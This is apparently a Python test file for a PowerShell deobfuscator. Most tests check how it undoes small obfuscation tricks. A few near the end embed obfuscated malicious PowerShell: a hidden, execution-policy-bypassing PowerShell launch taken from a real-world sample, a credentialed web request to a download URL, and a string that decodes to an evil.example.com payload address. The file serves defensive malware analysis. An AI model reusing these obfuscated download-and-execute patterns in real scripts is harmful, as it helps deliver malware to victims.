from .. import TestUnitBase


class TestPowerShellASTDeobfuscator(TestUnitBase):

    def test_format_string_basic(self):
        data = b'"{0}{2}{1}" -f "signa","ures","t"'
        result = self.load().process(data)
        self.assertIn(b'signatures', result)

    def test_format_string_in_parens(self):
        data = b'("{0}{2}{1}"-f "signa","ures","t")'
        result = self.load().process(data)
        self.assertIn(b'signatures', result)

    def test_format_string_single_quotes(self):
        data = b"('{2}{0}{1}'-f'c','m','g')"
        result = self.load().process(data)
        self.assertIn(b'gcm', result)

    def test_concat_basic(self):
        data = b"'foo' + 'bar'"
        result = self.load().process(data)
        self.assertIn(b'foobar', result)

    def test_concat_double_quotes(self):
        data = b'"hel" + "lo"'
        result = self.load().process(data)
        self.assertIn(b'hello', result)

    def test_bracket_removal_string(self):
        data = b'("hello")'
        result = self.load().process(data)
        self.assertNotIn(b'(', result)
        self.assertIn(b'hello', result)

    def test_bracket_removal_integer(self):
        data = b'(42)'
        result = self.load().process(data)
        self.assertEqual(result.strip(), b'42')

    def test_typecast_char(self):
        data = b'[char]120'
        result = self.load().process(data)
        self.assertIn(b'x', result)

    def test_typecast_char_hex(self):
        data = b'[char]0x41'
        result = self.load().process(data)
        self.assertIn(b'A', result)

    def test_typecast_string_strip(self):
        data = b'[string]"foo"'
        result = self.load().process(data)
        self.assertIn(b'foo', result)
        self.assertNotIn(b'[string]', result)

    def test_typecast_char_array(self):
        data = b'[char[]](72,101,108,108,111)'
        result = self.load().process(data)
        self.assertIn(b'Hello', result)

    def test_string_replace_method(self):
        data = b'"haystack".Replace("hay","needle")'
        result = self.load().process(data)
        self.assertIn(b'needlestack', result)

    def test_string_replace_operator(self):
        data = b'"Hello World" -replace "World","Earth"'
        result = self.load().process(data)
        self.assertIn(b'Hello Earth', result)

    def test_chained_replace_operator(self):
        data = b'"ABCDEF" -replace \'AB\',\'ab\' -replace \'CD\',\'cd\' -replace \'EF\',\'ef\''
        result = self.load().process(data)
        self.assertIn(b'abcdef', result)

    def test_uncurly_variable(self):
        data = b'${variable}'
        result = self.load().process(data)
        self.assertEqual(result.strip(), b'$variable')

    def test_case_normalize_invoke_expression(self):
        data = b"iNVokE-exPreSSion"
        result = self.load().process(data)
        self.assertIn(b'Invoke-Expression', result)

    def test_case_normalize_get_variable(self):
        data = b'gEt-VaRIAblE'
        result = self.load().process(data)
        self.assertIn(b'Get-Variable', result)

    def test_case_normalize_set_variable(self):
        data = b'sEt-VarIAbLE'
        result = self.load().process(data)
        self.assertIn(b'Set-Variable', result)

    def test_invoke_simplification_member(self):
        data = b'$x.ToString.Invoke()'
        result = self.load().process(data)
        self.assertIn(b'$x.ToString()', result)

    def test_invoke_simplification_quoted_member(self):
        data = b'$x."ToString"()'
        result = self.load().process(data)
        self.assertIn(b'$x.ToString()', result)

    def test_command_invocation_ampersand(self):
        data = b'& ("Invoke-Expression")'
        result = self.load().process(data)
        self.assertIn(b'Invoke-Expression', result)
        self.assertNotIn(b'&', result)

    def test_command_invocation_dot(self):
        data = b". ('Set-Variable') foo 42"
        result = self.load().process(data)
        self.assertIn(b'Set-Variable', result)

    def test_b64convert(self):
        data = b'[System.Convert]::FromBase64String("AQID")'
        result = self.load().process(data)
        self.assertIn(b'0x01', result)
        self.assertIn(b'0x02', result)
        self.assertIn(b'0x03', result)

    def test_encoding_utf8(self):
        data = b'[System.Text.Encoding]::UTF8.GetString(@(72, 101, 108, 108, 111))'
        result = self.load().process(data)
        self.assertIn(b'Hello', result)

    def test_gcm_unwrap(self):
        data = b"& (gcm 'Set-Variable') foo 42"
        result = self.load().process(data)
        self.assertIn(b'Set-Variable', result)
        self.assertNotIn(b'gcm', result)

    def test_real_world_01(self):
        data = BR'''&('set-varIAbLE') gHc7R6XtR8aE 16;.('SET-vaRIabLE') PkfYKFVSBTmn 27;.(.    ('{2}{0}{1}'-f'c','m','g')    ('{4}{2}{3}{0}{5}{6}{7}{8}{6}{9}{1}{2}'-f'-','l','e','t','s','v','a','r','i','b')) EUCsMplIyR03 43;&(&('{0}{1}{2}'-f'g','c','m')"seT-VARiaBLe") F8riv8rRCqrK((((&"get-vARiaBle" gHc7R6XtR8aE).('vaLUE')+29)-AS[chaR]).('tOsTrinG').iNVoke()+(((."GeT-VaRIAblE" PkfYKFVSBTmn).('{4}{2}{0}{1}{3}'-f'l','u','a','e','v')+74)-as[CHAR]).('tosTrInG').INVOke()+(((&"gEt-VarIabLe" EUCsMplIyR03)."VaLUE"+56)-as[cHAr]).('{4}{2}{5}{4}{3}{1}{0}{6}'-f'n','i','o','r','t','s','g').INvOke());PowERsHELL -NONiNtErac -nOLOgo -NOP -Windows HIDDEn -ExEC BYpasS (    .('{7}{4}{9}{0}{2}{3}{1}{6}{3}{5}{8}{4}'-f'-','r','v','a','e','b','i','g','l','t') F8riv8rRCqrK).('{4}{3}{1}{0}{2}'-f'u','l','e','a','v')    .('{5}{2}{6}{5}{4}{0}{1}{3}'-f'i','n','o','g','r','t','s').iNvokE()'''
        result = self.load().process(data)
        self.assertTrue(
            result.count(b'Set-Variable') == 4
        )

    def test_format_string_evaluation(self):
        data = (
            b'''(  ITeM  VarIAbLe:2OF09b  ).VaLue::"dEFauLtneTwORkcrEdEnTiALs"'''
            b''';.("{1}{0}"-f'wr','i')'''
            b'''("{4}{0}{8}{2}{3}{1}{5}{6}{7}"-f'/',':443','.','.com','http:/','/','download/p','owershell/','example')'''
        )
        deob = self.load()
        result = data | deob | str
        self.assertIn('example..com', result)

    def test_string_replace_chain(self):
        data = (
            b"'hfTdH8C6z2Wr6qQRvil.z2Wr6qQRxamplz2Wr6qQR.cs97YMGcyg0WCrm/bs97YMGcyg0WCrs97YMGcyg0WCrm'"
            b".Replace('fTdH8C6','ttps://')"
            b".Replace('s97YMGcyg0WCr','o')"
            b".Replace('z2Wr6qQR', 'e')"
        )
        result = self.load().process(data)
        self.assertIn(b'https://evil.example.com/boom', result)
